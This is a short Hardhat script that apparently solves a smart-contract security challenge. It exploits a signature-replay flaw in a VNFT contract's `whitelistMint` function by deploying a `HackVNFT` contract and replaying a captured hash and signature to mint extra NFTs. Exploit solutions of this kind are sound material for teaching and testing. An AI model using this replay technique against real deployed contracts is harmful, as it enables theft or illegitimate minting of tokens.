const hre = require("hardhat");
const { ethers } = hre;

const vnftAddress = '0xc357c220d9ffe0c23282fcc300627f14d9b6314c';
const hash = '0xd54b100c13f0d0e7860323e08f5eeb1eac1eeeae8bf637506280f00acd457f54';
const signature = '0xf80b662a501d9843c0459883582f6bb8015785da6e589643c2e53691e7fd060c24f14ad798bfb8882e5109e2756b8443963af0848951cffbd1a0ba54a2034a951c';

// The signature in the function `whitelistMint` can be replayed using values from a previous transaction.
// We can then make a contract that mints 2 NFTs several times using the `whitelistMint` and then
// transfer those back to the player.
async function main() {
  const [signer] = await ethers.getSigners();

  const VNFT = await ethers.getContractFactory("VNFT");
  const vnft = VNFT.attach(vnftAddress);

  const HackVNFT = await ethers.getContractFactory("HackVNFT");
  const hackVNFT = await HackVNFT.deploy();
  await hackVNFT.deployed();

  const tx = await hackVNFT.hack(hash, signature, vnftAddress);
  console.log('TX: ', tx.hash);
  await tx.wait();

  console.log('Player NFT balance:', (await vnft.balanceOf(signer.address)).toString());

  console.log('Done!');
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
